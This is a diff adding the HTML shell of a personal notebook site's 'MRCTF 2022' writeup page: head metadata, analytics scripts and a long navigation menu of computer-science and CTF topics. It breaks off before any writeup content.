@@ -1,0 +1,2366 @@
+
+  <!doctype html>
+  <html lang="zh" class="no-js">
+    <head>
+      
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        
+          <meta name="description" content="鹤翔万里（TonyCrane）的笔记本">
+        
+        
+        
+          <link rel="canonical" href="https://note.tonycrane.cc/writeups/mrctf2022/">
+        
+        <link rel="icon" href="../../assets/images/favicon.png">
+        <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
+      
+      
+        
+          <title>MRCTF 2022 - 鹤翔万里的笔记本</title>
+        
+      
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/main.bb3983ee.min.css">
+        
+          
+          <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+          
+        
+      
+      
+      
+        
+          
+          <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+          <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,400,400i,700%7CJetBrains+Mono&display=fallback">
+          <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
+        
+      
+      
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css">
+      
+        <link rel="stylesheet" href="../../css/tasklist.css">
+      
+        <link rel="stylesheet" href="../../css/custom.css">
+      
+      <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+      
+        
+  
+
+
+  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?c273de7f67d992cb6aef08c3ddf09bb2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  
+
+
+  <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-DYETCPM289"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&gtag("event","search",{search_term:this.value})}),"undefined"!=typeof location$&&location$.subscribe(function(e){gtag("config","G-DYETCPM289",{page_path:e.pathname})})})</script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-DYETCPM289"></script>
+
+
+      
+      
+    </head>
+    
+    
+      
+      
+        
+      
+      
+      
+      
+      <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+    
+      <script src="../../js/scheme.js" type="text/javascript"></script>
+      
+      
+        <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script>
+      
+      <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+      <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+      <label class="md-overlay" for="__drawer"></label>
+      <div data-md-component="skip">
+        
+          
+          <a href="#mrctf-2022-writeup" class="md-skip">
+            跳转至
+          </a>
+        
+      </div>
+      <div data-md-component="announce">
+        
+      </div>
+      
+      
+        
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="鹤翔万里的笔记本" class="md-header__button md-logo" aria-label="鹤翔万里的笔记本" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            鹤翔万里的笔记本
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              MRCTF 2022
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    <div class="md-header__options">
+      <div class="md-header-nav__scheme md-header-nav__button md-source__icon md-icon">
+          <a
+            href="javascript:toggleScheme();"
+            title="Light mode"
+            class="light-mode"
+          >
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22z"/></svg>
+          </a>
+          <a
+            href="javascript:toggleScheme();"
+            title="Dark mode"
+            class="dark-mode"
+          >
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31z"/></svg>
+          </a>
+          <a
+            href="javascript:toggleScheme();"
+            title="System preference"
+            class="system-mode"
+          >
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7.5 2c-1.79 1.15-3 3.18-3 5.5s1.21 4.35 3.03 5.5C4.46 13 2 10.54 2 7.5A5.5 5.5 0 0 1 7.5 2m11.57 1.5 1.43 1.43L4.93 20.5 3.5 19.07 19.07 3.5m-6.18 2.43L11.41 5 9.97 6l.42-1.7L9 3.24l1.75-.12.58-1.65L12 3.1l1.73.03-1.35 1.13.51 1.67m-3.3 3.61-1.16-.73-1.12.78.34-1.32-1.09-.83 1.36-.09.45-1.29.51 1.27 1.36.03-1.05.87.4 1.31M19 13.5a5.5 5.5 0 0 1-5.5 5.5c-1.22 0-2.35-.4-3.26-1.07l7.69-7.69c.67.91 1.07 2.04 1.07 3.26m-4.4 6.58 2.77-1.15-.24 3.35-2.53-2.2m4.33-2.7 1.15-2.77 2.2 2.54-3.35.23m1.15-4.96-1.14-2.78 3.34.24-2.2 2.54M9.63 18.93l2.77 1.15-2.53 2.19-.24-3.34z"/></svg>
+          </a>
+           <a
+            href="javascript:toggleScheme();"
+            title="Unknown scheme"
+            class="unknown-mode"
+          >
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m15.07 11.25-.9.92C13.45 12.89 13 13.5 13 15h-2v-.5c0-1.11.45-2.11 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41a2 2 0 0 0-2-2 2 2 0 0 0-2 2H8a4 4 0 0 1 4-4 4 4 0 0 1 4 4 3.2 3.2 0 0 1-.93 2.25M13 19h-2v-2h2M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10c0-5.53-4.5-10-10-10z"/></svg>
+          </a>
+      </div>
+    </div>
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/TonyCrane/note/" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+      
+      <div class="md-container" data-md-component="container">
+        
+        
+          
+            
+              
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        Home
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../cs/" class="md-tabs__link">
+        Computer Science
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../ctf/" class="md-tabs__link">
+        CTF
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link md-tabs__link--active">
+        Writeups
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../misc/" class="md-tabs__link">
+        Miscellaneous
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+            
+          
+        
+        <main class="md-main" data-md-component="main">
+          <div class="md-main__inner md-grid">
+            
+              
+                <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                  <div class="md-sidebar__scrollwrap">
+                    <div class="md-sidebar__inner">
+                      
+                        
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="鹤翔万里的笔记本" class="md-nav__button md-logo" aria-label="鹤翔万里的笔记本" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2z"/></svg>
+
+    </a>
+    鹤翔万里的笔记本
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/TonyCrane/note/" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+        
+          
+            
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../..">Home</a>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Home" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          Home
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../cs/">Computer Science</a>
+          
+            <label for="__nav_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Computer Science" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Computer Science
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../cs/pl/">Programming Language</a>
+          
+            <label for="__nav_2_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Programming Language" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Programming Language
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/pl/c_cpp/" class="md-nav__link">
+        C/C++
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/pl/haskell/" class="md-nav__link">
+        Haskell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/pl/asm/" class="md-nav__link">
+        Assembly
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3" type="checkbox" id="__nav_2_3" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../cs/system/">Computer System</a>
+          
+            <label for="__nav_2_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Computer System" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Computer System
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_3_2" type="checkbox" id="__nav_2_3_2" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../cs/system/cs1/">Computer System I</a>
+          
+            <label for="__nav_2_3_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Computer System I" data-md-level="3">
+        <label class="md-nav__title" for="__nav_2_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          Computer System I
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/system/cs1/topic1/" class="md-nav__link">
+        Number Representations
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/system/cs1/topic2/" class="md-nav__link">
+        Digital Logic
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../cs/web/">Web</a>
+          
+            <label for="__nav_2_4">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Web" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Web
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/web/svg/" class="md-nav__link">
+        SVG
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/regex/" class="md-nav__link">
+        RegEx
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cs/unicode/" class="md-nav__link">
+        Unicode
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../ctf/">CTF</a>
+          
+            <label for="__nav_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="CTF" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          CTF
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../ctf/steg/">Steganography</a>
+          
+            <label for="__nav_3_2">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Steganography" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          Steganography
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/steg/image/" class="md-nav__link">
+        Image Steganography
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/steg/audio/" class="md-nav__link">
+        Audio Steganography
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../../ctf/escapes/">Sandbox Escapes</a>
+          
+            <label for="__nav_3_3">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Sandbox Escapes" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          Sandbox Escapes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/escapes/pysandbox/" class="md-nav__link">
+        Python Sandbox Escape
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/coding/" class="md-nav__link">
+        Coding & Cipher
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/qrcode/" class="md-nav__link">
+        QRCode
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctf/esolang/" class="md-nav__link">
+        Esolang
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+            
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        
+        
+        <div class="md-nav__link md-nav__link--index ">
+          <a href="../">Writeups</a>
+          
+            <label for="__nav_4">
+              <span class="md-nav__icon md-icon"></span>
+            </label>
+          
+        </div>
+      
+      <nav class="md-nav" aria-label="Writeups" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Writeups
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4_2">
+          Training
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Training" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_2">
+          <span class="md-nav__icon md-icon"></span>
+          Training
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ethernaut/" class="md-nav__link">
+        Ethernaut
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SecurityInnovation/" class="md-nav__link">
+        Security Innovation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AAA/" class="md-nav__link">
+        🔒 AAA School Bus
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4_3">
+          2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_3">
+          <span class="md-nav__icon md-icon"></span>
+          2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sysu_msc_puzzle/" class="md-nav__link">
+        SYSU MSC Puzzle 2021
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackergame2021/" class="md-nav__link">
+        USTC Hackergame 2021
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../d0g3/" class="md-nav__link">
+        第四届“安洵杯”
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bytectf2021_final/" class="md-nav__link">
+        ByteCTF 2021 Final
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sctf2021/" class="md-nav__link">
+        SCTF 2021
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4_4">
+          2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_4">
+          <span class="md-nav__icon md-icon"></span>
+          2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vnctf2022/" class="md-nav__link">
+        VNCTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tqlctf2022/" class="md-nav__link">
+        TQLCTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../susctf2022/" class="md-nav__link">
+        SUSCTF 2022
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
